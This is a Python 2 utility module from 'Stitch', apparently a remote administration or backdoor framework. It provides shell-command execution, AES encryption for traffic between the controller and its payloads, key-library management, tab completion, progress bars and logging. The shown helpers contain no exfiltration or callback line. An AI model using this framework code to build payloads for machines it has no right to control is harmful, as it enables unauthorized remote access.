#-*- coding: utf-8 -*-
#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import cmd
import sys
import zlib
import glob
import time
import math
import base64
import socket
import struct
import shutil
import sqlite3
import zipfile
import threading
import cStringIO
import contextlib
import subprocess
import ConfigParser
from time import sleep
from Crypto import Random
from getpass import getpass
from Crypto.Cipher import AES
from time import strftime, sleep
from Stitch_Vars.globals import *
from Stitch_Vars.st_aes import *
from colorama import Fore, Back, Style, init, deinit, reinit

if sys.platform.startswith('win'):
    init()
    import readline
    import win32crypt
    p_bar = "="
    temp = 'C:\\Windows\\Temp\\'
    readline.parse_and_bind("tab: complete")
else:
    temp = '/tmp/'
    import readline
    import rlcompleter
    p_bar = '█'
    if 'libedit' in readline.__doc__:
        readline.parse_and_bind("bind ^I rl_complete")
    else:
        readline.parse_and_bind("tab: complete")

if configuration_path not in sys.path:
    sys.path.append(configuration_path)

aes_lib = ConfigParser.ConfigParser()
aes_lib.read(st_aes_lib)
if aes_abbrev not in aes_lib.sections():
    aesfile = open(st_aes_lib,'wb')
    aes_lib.add_section(aes_abbrev)
    aes_lib.set(aes_abbrev, 'aes_key', aes_encoded)
    aes_lib.write(aesfile)
    aesfile.close()

def run_command(command):
    try:
        subp = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        subp_output, errors = subp.communicate()
        if not errors:
            if subp_output == '':
                return '[+] Command successfully executed.\n'
            else:
                return subp_output
        return "[!] {}".format(errors)
    except KeyboardInterrupt:
        print "Terminated command."

def start_command(command):
    try:
        subp = subprocess.Popen(command, shell=True,
             stdin=None, stdout=None, stderr=None, close_fds=True)
        return '[+] Command successfully started.\n'
    except Exception as e:
        return '[!] {}\n'.format(str(e))

def no_error(cmd_output):
    if cmd_output.startswith("ERROR:") or cmd_output.startswith("[!]"):
        return False
    else:
        return True

def encrypt(raw, aes_key=secret):
    iv = Random.new().read( AES.block_size )
    cipher = AES.new(aes_key, AES.MODE_CFB, iv )
    return (base64.b64encode( iv + cipher.encrypt( raw ) ) )

def decrypt(enc, aes_key=secret):
    enc = base64.b64decode(enc)
    iv = enc[:16]
    cipher = AES.new(aes_key, AES.MODE_CFB, iv )
    return cipher.decrypt( enc[16:] )

def show_aes():
    st_print('=== Stitch AES Key ===')
    st_print('   {}'.format(aes_encoded))
    st_print('[*] Copy and add this key to another system running Stitch to '\
              'enable communication from payloads created on this system.\n')

def add_aes(key):
    aes_lib = ConfigParser.ConfigParser()
    aes_lib.read(st_aes_lib)
    if len(key) != 44:
        st_print('[!] Invalid AES key. Keys must be 32 bytes after decryption.\n')
    else:
        try:
            decr_key = base64.b64decode(key)
        except Exception as e:
            err = "[!] Decryption error: {}\n".format(str(e))
            st_print(err)
        else:
            if len(decr_key) != 32:
                st_print('[!] Invalid AES key. Keys must be 32 bytes after decryption.\n')
            else:
                aes_abbrev = '{}{}{}{}{}{}{}{}{}{}{}{}{}'.format(
                    key[21],key[0],key[1],key[43],key[5],key[13],key[7],key[24],key[31],
                    key[35],key[16],key[39],key[28])
                sec_exists = False
                if aes_abbrev in aes_lib.sections():
                    sec_exists = True
                    # Getting a key that is almost exactly like one you already
                    # have is unlikely, this is just a precaution
                    if aes_lib.get(aes_abbrev,'aes_key') == key:
                        st_print('[*] The AES key has already been added to this system.\n')
                        return
                aesfile = open(st_aes_lib,'wb')
                if not sec_exists:
                    aes_lib.add_section(aes_abbrev)
                aes_lib.set(aes_abbrev, 'aes_key', key)
                aes_lib.write(aesfile)
                aesfile.close()
                st_print('[+] Successfully added "{}" to the AES key library\n'.format(key))
                aes_lib.read(st_aes_lib)

def windows_client(system = sys.platform):
    if system.startswith('win'):
        return True
    else:
        return False

def osx_client(system = sys.platform):
    if system.startswith('darwin'):
        return True
    else:
        return False

def linux_client(system = sys.platform):
    if system.startswith('linux'):
        return True
    else:
        return False

def st_print(text):
    if text.startswith('[+]'):
        text = '\n{}'.format(text)
        print_green(text)
        st_log.info(text[5:].strip())
    elif text.startswith('[*]'):
        text = '\n{}'.format(text)
        print_yellow(text)
    elif text.startswith('==='):
        text = '\n{}'.format(text)
        print_cyan(text)
    elif text.startswith('[-]') or text.startswith('[!]') or text.startswith('ERROR'):
        text = '\n{}'.format(text)
        print_red(text)
        if text.startswith('\n[-]'):
            st_log.info(text[5:].strip())
        if text.startswith('\n[!]'):
            st_log.error(text[5:].strip())
        if text.startswith('\nERROR'):
            st_log.error(text[9:].strip())
    else:
        text = '\n{}'.format(text)
        print text

def print_yellow(string):
    if windows_client(): reinit()
    print (Fore.YELLOW + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client(): deinit()

def print_blue(string):
    if windows_client(): reinit()
    print (Fore.BLUE + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client(): deinit()

def print_cyan(string):
    if windows_client(): reinit()
    print (Fore.CYAN + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client(): deinit()

def print_green(string):
    if windows_client(): reinit()
    print (Fore.GREEN + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client(): deinit()

def print_red(string):
    if windows_client(): reinit()
    print (Fore.RED + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client(): deinit()

def get_cwd():
    path = os.getcwd()
    path = path + '>'
    return path

def display_banner():
    clear_screen()
    print banner

def clear_screen():
    if windows_client():
        os.system("cls")
    else:
        os.system("clear")

def check_int(val):
    try:
        is_int = int(val)
        return True
    except ValueError:
        print "{} is not a valid number.".format(val)
        return False

def append_slash_if_dir(p):
    if p and os.path.isdir(p) and p[-1] != os.sep:
        return p + os.sep
    else:
        return p

def find_patterns(text, line, begidx, endidx, search):
    f = []
    before_arg = line.rfind(" ", 0, begidx)
    if before_arg == -1:
        return # arg not found

    fixed = line[before_arg+1:begidx]  # fixed portion of the arg
    arg = line[before_arg+1:endidx]

    for n in search:
        if n.startswith(arg):
            f.append(n)
    return f

def find_path(text, line, begidx, endidx, \
                dir_only=False, files_only=False, exe_only=False,\
                py_only=False, uploads=False, all_dir=False):
    cur_dir = os.getcwd()
    before_arg = line.rfind(" ", 0, begidx)
    if before_arg == -1:
        return # arg not found

    fixed = line[before_arg+1:begidx]  # fixed portion of the arg
    arg = line[before_arg+1:endidx]

    if uploads:
        os.chdir(uploads_path)
    pattern = arg + '*'

    completions = []
    for path in glob.glob(pattern):
        if dir_only:
            if os.path.isdir(path):
                path = append_slash_if_dir(path)
                completions.append(path.replace(fixed, "", 1))
        elif files_only:
            if not os.path.isdir(path):
                completions.append(path.replace(fixed, "", 1))
        elif exe_only:
            if not os.path.isdir(path):
                if path.endswith('.exe') or path.endswith('.py'):
                    completions.append(path.replace(fixed, "", 1))
        elif py_only:
            if not os.path.isdir(path):
                if path.endswith('.py'):
                    completions.append(path.replace(fixed, "", 1))
        elif all_dir:
            if os.path.isdir(path):
                path = append_slash_if_dir(path)
            completions.append(path.replace(fixed, "", 1))

    os.chdir(cur_dir)
    return completions

def find_completion(text,opt_list):
    option = []
    for n in opt_list:
        if text:
            if n.startswith(text): option.append(n)
        else:
            option.append(n)
    return option

class progress_bar():
    def __init__(self,size):
        self.size     = int(size)
        self.tick     = 0
        self.tracker  = 0
        self.progress = 0
        self.bar_size = 50
        self.percent  = self.size/self.bar_size

    def file_info(self):
        file_size = convertSize(float(self.size))
        st_print('Total Size: {} ({} bytes)'.format(file_size,self.size))
        self.display()

    def display(self):
        p_output = "[{}] %0".format(" " * self.bar_size)
        sys.stdout.write(p_output)
        sys.stdout.flush()
        sys.stdout.write("\b" * (len(p_output)))

    def increment(self, inc_track=1024, inc_prog=1024, file_inc=True):
        self.tracker  += inc_track
        self.progress += inc_prog
        if file_inc:
            while self.progress >= self.percent and self.tracker < self.size:
                self.progress = self.progress - self.percent
                self.tick += 1
                space = self.bar_size - self.tick
                total_percentage = 2 * self.tick
                p_output = "[{}{}] %{}".format(p_bar * self.tick, ' ' * space, total_percentage)
                sys.stdout.write(p_output)
                sys.stdout.flush()
                sys.stdout.write("\b" * (len(p_output)))
        else:
            self.tick = int((float(self.progress)/float(self.size)) * float(self.bar_size))
            space = self.bar_size - self.tick
            total_percentage = 2 * self.tick
            p_output = "[{}{}] %{}".format(p_bar * self.tick, ' ' * space, total_percentage)
            sys.stdout.write(p_output)
            sys.stdout.flush()
            sys.stdout.write("\b" * (len(p_output)))

    def complete(self):
        sys.stdout.write("[{}] %100\n".format(p_bar * self.bar_size))
        sys.stdout.flush()

def print_border(length,border):
    print border * length

def st_logger(resp,log_path,log_name,verbose=True):
    if no_error(resp):
        i = 1
        log = os.path.join(log_path,'{}.log'.format(log_name))
        while os.path.exists(log):
            new_log_name = '{} ({}).log'.format(log_name,i)
            log = os.path.join(log_path,new_log_name)
            i += 1
        if verbose: st_print("[+] Output has been written to {}\n".format(log))
        with open(log,'w') as l:
            l.write(resp)

#http://stackoverflow.com/questions/2828953/silence-the-stdout-of-a-function-in-python-without-trashing-sys-stdout-and-resto
@contextlib.contextmanager
def nostdout():
    '''Prevent print to stdout, but if there was an error then catch it and
    print the output before raising the error.'''
    saved_stdout = sys.stdout
    sys.stdout = cStringIO.StringIO()
    try:
        yield
    except Exception:
        saved_output = sys.stdout
        sys.stdout = saved_stdout
        print saved_output.getvalue()
        raise
    sys.stdout = saved_stdout

#http://stackoverflow.com/questions/5194057/better-way-to-convert-file-sizes-in-python
def convertSize(size):
   if (size == 0):
       return '0 Bytes'
   size_name = ("Bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
   i = int(math.floor(math.log(size,1024)))
   p = math.pow(1024,i)
   s = round(size/p,2)
   return '{} {}'.format(s,size_name[i])

def zipdir(path, zipn):
    for root, dirs, files in os.walk(path):
        for file in files:
            zipn.write(os.path.join(root, file))
